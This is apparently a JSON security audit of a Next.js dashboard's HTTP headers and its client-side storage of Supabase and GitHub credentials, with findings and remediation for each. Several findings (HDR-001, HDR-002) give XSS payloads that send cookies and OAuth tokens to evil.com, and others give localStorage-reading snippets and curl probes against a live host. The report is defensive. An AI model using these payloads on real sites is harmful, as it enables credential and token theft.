{
  "category": "headers",
  "analyzed_at": "2026-02-06T00:00:00Z",
  "findings": [
    {
      "id": "HDR-001",
      "type": "missing_header",
      "severity": "high",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/next.config.js",
      "line": 7,
      "vulnerable_code": "async headers() { return [{ source: '/:path*', headers: [ /* no CSP header */ ] }] }",
      "exploit_payload": "If an XSS vector is found elsewhere (e.g., reflected input in query params, DOM-based injection via localStorage values), there is no CSP to prevent execution of injected scripts. An attacker could inject <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> and it would execute unrestricted. Without CSP, any inline script, eval(), or third-party script tag will run.",
      "exploit_url": "curl -v https://mason.assuredefi.com/ 2>&1 | grep -i 'content-security-policy'",
      "impact": "No Content-Security-Policy header is configured anywhere in the application (not in next.config.js headers, no middleware.ts, no meta tags). This means the browser has no restrictions on script sources, inline scripts, eval(), or resource loading. Any XSS vulnerability (reflected, stored, or DOM-based) would have unrestricted access to the DOM, cookies, localStorage (which stores Supabase credentials, OAuth tokens, and GitHub tokens), and can exfiltrate all user data.",
      "remediation": "Add a Content-Security-Policy header to next.config.js. Recommended baseline: \"default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co https://api.supabase.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'\". Tighten unsafe-inline/unsafe-eval after auditing Next.js requirements. Use nonces for inline scripts if possible."
    },
    {
      "id": "HDR-002",
      "type": "client_secret",
      "severity": "medium",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/app/api/auth/supabase/callback/route.ts",
      "line": 163,
      "vulnerable_code": "cookieStore.set('supabase_oauth_tokens', tokenData, { httpOnly: false, secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 60, path: '/' })",
      "exploit_payload": "During the 60-second window after OAuth callback, any JavaScript running on the page can read the cookie via document.cookie. If an XSS vector exists, the attacker can steal the Supabase Management API access token and refresh token. The access token grants database:write, api-keys:read, projects:read scopes to the user's Supabase organization. Combined with HDR-001 (no CSP), this is exploitable: <script>fetch('https://evil.com/steal?tokens='+encodeURIComponent(document.cookie.match(/supabase_oauth_tokens=([^;]+)/)[1]))</script>",
      "exploit_url": "N/A - requires XSS vector on the same origin during the 60-second cookie lifetime window",
      "impact": "Supabase OAuth access and refresh tokens are stored in a non-httpOnly cookie for 60 seconds. The access token has database:write, api-keys:read, projects:read scopes on the Supabase Management API. An attacker with XSS access during this window could steal these tokens and gain full read/write access to the user's Supabase organization, including all projects, databases, and API keys. The refresh token enables persistent access beyond the 60-second window.",
      "remediation": "Instead of passing tokens via a client-readable cookie, use a server-side session or encrypted httpOnly cookie. The client can receive a session ID that maps to the tokens stored server-side. Alternatively, use a one-time-use token endpoint: callback sets an httpOnly cookie with a session ID, then the client calls a /api/auth/supabase/tokens endpoint that returns tokens once and deletes the session."
    },
    {
      "id": "HDR-003",
      "type": "client_secret",
      "severity": "medium",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/lib/supabase/user-client.ts",
      "line": 47,
      "vulnerable_code": "localStorage.getItem(STORAGE_KEYS.CONFIG) // stores {supabaseUrl, supabaseAnonKey, supabaseServiceKey}",
      "exploit_payload": "Any XSS vector can read all credentials from localStorage: JSON.parse(localStorage.getItem('mason_config')) returns supabaseUrl, supabaseAnonKey, and potentially supabaseServiceKey. Combined with JSON.parse(localStorage.getItem('mason_supabase_oauth_session')) which contains accessToken and refreshToken for the Supabase Management API. Also localStorage.getItem('mason_github_token') for the GitHub access token.",
      "exploit_url": "N/A - requires XSS. Verify exposure: In browser console run: Object.keys(localStorage).filter(k=>k.startsWith('mason_'))",
      "impact": "User's Supabase credentials (URL, anon key, potentially service role key), Supabase Management API OAuth tokens, and GitHub access token are all stored in localStorage. Unlike httpOnly cookies, localStorage is accessible to any JavaScript on the page. With no CSP (HDR-001), any XSS vulnerability gives an attacker access to: (1) the user's Supabase database with full read/write, (2) the user's Supabase Management API, (3) the user's GitHub account. This is the core of the privacy architecture -- all sensitive user data keys are in the browser.",
      "remediation": "This is an architectural design choice for privacy (user brings own database, server never sees credentials). Mitigations: (1) Implement CSP immediately (HDR-001) to drastically reduce XSS attack surface. (2) Consider encrypting localStorage values with a key derived from the user session. (3) Add subresource integrity (SRI) for any third-party scripts. (4) Implement a middleware.ts that adds CSP nonces. (5) Never store supabaseServiceKey client-side -- it should only exist server-side."
    },
    {
      "id": "HDR-004",
      "type": "client_secret",
      "severity": "medium",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/components/backlog/item-detail-modal.tsx",
      "line": 138,
      "vulnerable_code": "headers: { 'x-supabase-url': config.supabaseUrl, 'x-supabase-anon-key': config.supabaseAnonKey }",
      "exploit_payload": "Every API call from the dashboard to internal API routes sends the user's Supabase URL and anon key as plain HTTP headers. If any logging, monitoring, or CDN/proxy is configured to log request headers, these credentials are exposed. The pattern appears in 5 API route handlers and at least 4 client-side call sites. Headers are visible in browser DevTools Network tab, any HTTP proxy, and potentially in server-side request logs.",
      "exploit_url": "curl -v -H 'x-supabase-url: https://victim.supabase.co' -H 'x-supabase-anon-key: eyJhb...' https://mason.assuredefi.com/api/backlog/restore -d '{}'",
      "impact": "Supabase credentials transmitted in custom HTTP headers on every API call. While this is same-origin (browser to Next.js server), the credentials could be logged by: (1) Vercel's request logs, (2) any CDN/proxy in the chain, (3) browser extensions that intercept requests, (4) server-side error logging that dumps request headers. Found in: item-detail-modal.tsx, ItemTimeline.tsx, useBacklogMutations.ts, filtered-items-tab.tsx, and 5 API route handlers.",
      "remediation": "Consider using an encrypted httpOnly session cookie to store a reference to the user's Supabase credentials server-side, rather than sending them on every request. Alternatively, if the privacy model requires server never stores credentials, ensure all logging infrastructure is configured to redact x-supabase-* headers. Add these headers to Vercel's excluded headers list."
    },
    {
      "id": "HDR-005",
      "type": "cors_misconfiguration",
      "severity": "low",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/app/api/docs/openapi.json/route.ts",
      "line": 20,
      "vulnerable_code": "'Access-Control-Allow-Origin': '*'",
      "exploit_payload": "curl -H 'Origin: https://evil.com' https://mason.assuredefi.com/api/docs/openapi.json",
      "exploit_url": "curl -H 'Origin: https://evil.com' -v https://mason.assuredefi.com/api/docs/openapi.json 2>&1 | grep -i 'access-control'",
      "impact": "The OpenAPI specification endpoint allows any origin to fetch the full API documentation. This exposes: (1) all API endpoint paths and their parameters, (2) authentication schemes (Bearer token, session cookie details), (3) request/response schemas, (4) rate limiting configuration details, (5) server URLs (localhost:3000, mason.yourdomain.com). While OpenAPI specs are typically public, this serves as an attacker's reconnaissance tool by documenting every API surface. The endpoint is GET-only and read-only, so direct data exfiltration is not possible.",
      "remediation": "Low priority. If the API docs are intended to be public, this is acceptable. If not, restrict CORS to specific domains: 'Access-Control-Allow-Origin': 'https://mason.assuredefi.com'. Alternatively, gate this endpoint behind authentication."
    },
    {
      "id": "HDR-006",
      "type": "exposed_secret",
      "severity": "low",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/lib/feature-flags.ts",
      "line": 15,
      "vulnerable_code": "AUTOPILOT_BETA_USERS: ['chapo@assuredefi.com'], ADMIN_USERS: ['chapo@assuredefi.com']",
      "exploit_payload": "The admin and beta user email addresses are hardcoded in client-bundled source code. Since this is a Next.js file imported by client components, it will be included in the JavaScript bundle served to browsers. An attacker can: (1) identify admin accounts for targeted phishing, (2) use the email for credential stuffing against Supabase/GitHub, (3) attempt social engineering attacks against the known admin.",
      "exploit_url": "View page source or search JavaScript bundles for '@assuredefi.com' or 'chapo'",
      "impact": "Admin email address 'chapo@assuredefi.com' is embedded in client-side JavaScript bundles. This provides information for targeted attacks against the admin account. While not directly exploitable, it violates the principle of least information exposure.",
      "remediation": "Move feature flag checks to server-side API routes or middleware. Store beta/admin user lists in environment variables or a database table rather than hardcoding in source code. Example: use ADMIN_EMAILS env var parsed at runtime on the server, never sent to client."
    },
    {
      "id": "HDR-007",
      "type": "weak_csp",
      "severity": "low",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/next.config.js",
      "line": 36,
      "vulnerable_code": "'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), interest-cohort=()'",
      "exploit_payload": "N/A - this is a hardening gap, not directly exploitable",
      "exploit_url": "curl -v https://mason.assuredefi.com/ 2>&1 | grep -i 'permissions-policy'",
      "impact": "The Permissions-Policy header only restricts 4 browser APIs (camera, microphone, geolocation, FLoC). It does not restrict: accelerometer, ambient-light-sensor, autoplay, battery, bluetooth, clipboard-read, clipboard-write, display-capture, encrypted-media, fullscreen, gyroscope, hid, magnetometer, midi, payment, picture-in-picture, publickey-credentials-get, screen-wake-lock, serial, usb, xr-spatial-tracking. While most of these are unlikely attack vectors for a dashboard app, clipboard-read is notable as it could be used to read clipboard contents (potentially containing API keys or passwords the user copied).",
      "remediation": "Expand Permissions-Policy to include additional sensitive APIs: 'camera=(), microphone=(), geolocation=(), interest-cohort=(), clipboard-read=(), clipboard-write=(), payment=(), usb=(), bluetooth=(), serial=(), hid=(), display-capture=()'"
    },
    {
      "id": "HDR-008",
      "type": "missing_header",
      "severity": "low",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/next.config.js",
      "line": 25,
      "vulnerable_code": "{ key: 'X-XSS-Protection', value: '1; mode=block' }",
      "exploit_payload": "N/A - informational",
      "exploit_url": "N/A",
      "impact": "The X-XSS-Protection header is a deprecated legacy header. Modern browsers (Chrome 78+, Edge 79+, Firefox never supported it) have removed their XSS auditor. The header is harmless but provides a false sense of security. In older IE versions, the XSS auditor itself could be exploited to create new XSS vectors. This is informational only.",
      "remediation": "Consider removing the X-XSS-Protection header entirely and relying on CSP instead (which is currently missing - see HDR-001). If keeping for legacy browser support, the current value '1; mode=block' is the correct setting."
    },
    {
      "id": "HDR-009",
      "type": "missing_header",
      "severity": "low",
      "confidence": "confirmed",
      "file": "N/A - no middleware.ts or well-known directory exists",
      "line": 0,
      "vulnerable_code": "N/A",
      "exploit_payload": "N/A - informational",
      "exploit_url": "curl -v https://mason.assuredefi.com/.well-known/security.txt",
      "impact": "No security.txt file exists at /.well-known/security.txt or /security.txt. While not a vulnerability, RFC 9116 recommends providing a security.txt file so security researchers can report vulnerabilities through proper channels. No middleware.ts exists for adding dynamic security headers (CSP nonces, etc.).",
      "remediation": "Create packages/mason-dashboard/public/.well-known/security.txt with contact information, preferred languages, and encryption key. Create middleware.ts for dynamic CSP nonce generation."
    },
    {
      "id": "HDR-010",
      "type": "exposed_secret",
      "severity": "low",
      "confidence": "confirmed",
      "file": "packages/mason-dashboard/src/lib/supabase/client.ts",
      "line": 3,
      "vulnerable_code": "const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL; const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;",
      "exploit_payload": "View page source or network requests to see the central Supabase URL and anon key in the JavaScript bundle. The NEXT_PUBLIC_ prefix means these are embedded in client-side code.",
      "exploit_url": "curl -s https://mason.assuredefi.com/ | grep -o 'supabase\\.co[^\"]*' || curl -s https://mason.assuredefi.com/_next/static/chunks/*.js | grep -o 'eyJ[A-Za-z0-9_-]*'",
      "impact": "The central Mason Supabase URL and anon key are exposed in client-side bundles via NEXT_PUBLIC_ environment variables. While Supabase anon keys are designed to be public (they're used with RLS policies for access control), this is the CENTRAL database -- not a user's personal DB. If RLS policies are misconfigured on any table, the exposed anon key could allow unauthorized data access. The anon key combined with the URL allows anyone to attempt queries against the central Mason database.",
      "remediation": "This is expected Supabase architecture (anon key is public-facing, protected by RLS). Ensure: (1) RLS policies on all central DB tables are correctly configured and audited, (2) service role key is NEVER in NEXT_PUBLIC_ vars (verified - it uses SUPABASE_SERVICE_ROLE_KEY without NEXT_PUBLIC_ prefix), (3) central DB tables only contain minimal data per privacy architecture (users + repos, no secrets)."
    }
  ],
  "summary": {
    "total_findings": 10,
    "critical": 0,
    "high": 1,
    "medium": 3,
    "low": 6
  },
  "notes": {
    "env_files_committed": false,
    "env_local_in_gitignore": true,
    "hardcoded_api_keys_found": false,
    "hsts_via_vercel": "HSTS is likely provided by Vercel's hosting platform rather than application config - not found in next.config.js",
    "cors_scope": "Wildcard CORS is limited to a single read-only endpoint (/api/docs/openapi.json) - no CORS on data endpoints",
    "privacy_architecture_note": "The application intentionally stores sensitive credentials (Supabase URL/keys, GitHub token, OAuth tokens) in localStorage as part of its privacy-first architecture where the central server never stores user secrets. This is by design but creates a large XSS impact surface, making CSP implementation (HDR-001) critical.",
    "positive_findings": [
      "X-Frame-Options: DENY prevents clickjacking",
      "X-Content-Type-Options: nosniff prevents MIME-sniffing attacks",
      "Referrer-Policy: strict-origin-when-cross-origin is a good default",
      "PKCE with SHA-256 is used correctly for OAuth flow",
      "CSRF protection via state parameter validation on OAuth callback",
      "Open redirect protection with allowlisted return paths",
      ".env files are properly gitignored and never committed",
      "SUPABASE_SERVICE_ROLE_KEY does not use NEXT_PUBLIC_ prefix (correct)",
      "OAuth token cookie is scoped to 60 seconds with secure flag in production",
      "Server-side session check (getServerSession) required before processing x-supabase headers"
    ]
  }
}
